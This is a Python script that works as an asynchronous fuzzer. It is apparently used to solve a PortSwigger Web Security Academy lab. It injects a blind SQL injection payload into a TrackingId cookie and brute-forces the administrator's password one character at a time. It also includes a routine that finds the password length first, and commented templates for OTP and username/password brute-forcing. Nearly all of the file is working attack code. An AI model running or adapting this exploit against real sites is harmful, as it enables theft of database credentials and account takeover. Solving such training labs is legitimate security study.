import asyncio
import re
from common.base import inject_payloads, parse_raw_request
from common.utils import save_on_file

CONCURRENCY_LIMIT = 1
PRINT_OUTPUT_PREVIEW = False
SAVE_OUTPUT_TO_FILE = False

# RAW request (from Burp Intruder) with placeholders like §1§, §2§... or §CODE§, §USER§
RAW_REQUEST = """
GET /filter?category=Pets HTTP/2
Host: 0a1c00cc034bb5dd809d67ee006400fe.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:154.0) Gecko/20100101 Firefox/154.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Referer: https://0a1c00cc034bb5dd809d67ee006400fe.web-security-academy.net/
Cookie: session=BlbXyDIAePEoXIqm1KbNNAx52HSo5rpk; TrackingId=IQ629qN4TF6IQ2Gn'+AND+(SELECT+SUBSTRING(password,§POS§,1)+FROM+users+WHERE+username='administrator')='§LETTER§
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache
TE: trailers
""".strip()

import string
def generate_payloads():
    """
    Change this function depending on your needs.
    Returns something like this: {"§PLACEHOLDER§": "VALUE"}
    """

    # One-shot payload (no placeholders)
    # return [{}]

    for pos in range(1, 21):

        for l in string.ascii_lowercase:
            yield {"§LETTER§": l, "§POS§": pos}
        for l in string.ascii_uppercase:
            yield {"§LETTER§": l, "§POS§": pos}
        for n in range(10):
            yield {"§LETTER§": str(n), "§POS§": pos}

    # for n in range(2,30):
    #    yield {"§len§": n}
    
    # EXAMPLE 1: Single payload (4-digits OTP)
    #for otp in generate_otps(length=4):
    #    yield {"§CODE§": otp}

    # EXAMPLE 2: Multi-payload / Cluster Bomb (Username + Password)
    # usernames = ["admin", "carlos", "wiener"]
    # passwords = generate_wordlist("passwords.txt")
    # for user, pwd in itertools.product(usernames, passwords):
    #     yield {"§USER§": user, "§PASS§": pwd}

    # EXAMPLE 3: Pitchfork (Coupled values 1:1)
    # for user, pwd in zip(users_list, pass_list):
    #     yield {"§USER§": user, "§PASS§": pwd}

def check_victory (response):
    """Check if the response is a victory condition."""
    # return True
    return response.status_code == 200 and ("Welcome" in response.text)
    # return response.status_code == 302 # and "Location" in response.headers


async def test_code(client, semaphore, method, url, headers, body_template, payload_dict, stop_event):
    if stop_event.is_set():
        return

    async with semaphore:
        # Dynamic body replace
        body = inject_payloads(body_template, payload_dict)
        
        # Dynamic headers replace (ex. Cookie or X-Forwarded-For)
        req_headers = {
            k: inject_payloads(v, payload_dict) for k, v in headers.items()
        }

        try:
            response = await client.request(
                method=method,
                url=url,
                headers=req_headers,
                content=body,
                follow_redirects=False # IMPORTANT if you need to check the return code 302
            )

            # Victory condition
            if check_victory(response):
                stop_event.set()
                result = {
                    "payload": payload_dict,
                    "status_code": response.status_code,
                    "headers": dict(response.headers),
                    "http_version": response.http_version,
                    "reason": response.reason_phrase,
                    "text_preview": response.text[:100] if PRINT_OUTPUT_PREVIEW else None,
                    "full_text": response.text if SAVE_OUTPUT_TO_FILE else None,
                }

                print(f"\n[+] Valid response (HTTP {response.status_code})!")
                print(f"[+] Valid payload: {payload_dict}")

                if PRINT_OUTPUT_PREVIEW:
                    print("\n" + response.text[:100])
                    if len(response.text) > 100:
                        print("\n[... Output truncated ...]")

                if SAVE_OUTPUT_TO_FILE:
                    full_output = f"HTTP/{response.http_version} {response.status_code} {response.reason_phrase}\n"
                    full_output += "\n".join([f"{k}: {v}" for k, v in response.headers.items()])
                    full_output += "\n\n" + response.text
                    save_on_file(full_output, filename='/tmp/brute.html')

                return result
                
        except Exception as ex:
            print(ex)
            pass

async def main():
    result = await run_payloads()
    if result:
        print(f"\n[>] Winner: {result['payload']}")
    else:
        print("\n[-] No valid payload found.")


async def run_payloads(payload_iterable=None):
    """Run payloads from a generator/iterable and return the first successful result.
    If `payload_iterable` is None, uses the module-level `generate_payloads()` generator.
    """
    method, url, headers, body_template = parse_raw_request(RAW_REQUEST)
    print(f"[*] Inizio fuzzer su {url}...")

    semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
    stop_event = asyncio.Event()

    import httpx
    limits = httpx.Limits(max_connections=CONCURRENCY_LIMIT, max_keepalive_connections=CONCURRENCY_LIMIT)
    async with httpx.AsyncClient(http2=True, limits=limits, verify=False) as client:
        tasks = []
        iterable = payload_iterable if payload_iterable is not None else generate_payloads()

        # Default behavior: run sequentially (useful for interactive multi-step attacks)
        for payload_dict in iterable:
            res = await test_code(client, semaphore, method, url, headers, body_template, payload_dict, stop_event)
            if res:
                return res

    return None


def gen_length_payloads(max_len=40, placeholder="§len§"):
    """Yield payloads to test different lengths."""
    for n in range(1, max_len + 1):
        yield {placeholder: n}


def gen_char_payloads_for_pos(pos, charset=None, pos_placeholder="§POS§", letter_placeholder="§LETTER§"):
    """Yield payloads to test characters for a specific position."""
    import string
    if charset is None:
        charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
    for ch in charset:
        yield {pos_placeholder: pos, letter_placeholder: ch}


async def brute_force_password(max_len=40, charset=None):
    """High-level two-phase brute-force:
    1) discover length using `§len§` placeholder
    2) for each position, discover a single character using `§POS§` and `§LETTER§` placeholders

    Returns the discovered password or None on failure.
    """
    # Phase 1: discover length
    length_result = await run_payloads(payload_iterable=gen_length_payloads(max_len),)
    if not length_result:
        return None

    # extract length from payload dict (assumes single key)
    found_len = None
    for v in length_result['payload'].values():
        try:
            found_len = int(v)
            break
        except Exception:
            continue

    if not found_len:
        return None

    password = ''
    for pos in range(1, found_len + 1):
        res = await run_payloads(payload_iterable=gen_char_payloads_for_pos(pos, charset))
        if not res:
            # could not find char for this position
            return None
        # assume payload contains §LETTER§ value
        letter = None
        for k, v in res['payload'].items():
            if k.startswith('§'):
                # heuristic: if key contains LETTER or POS
                if 'LETTER' in k or 'letter' in k or 'POS' not in k:
                    letter = v
                    break
        if letter is None:
            # fallback: take first value
            letter = list(res['payload'].values())[0]
        password += str(letter)

    return password

if __name__ == "__main__":
    asyncio.run(main())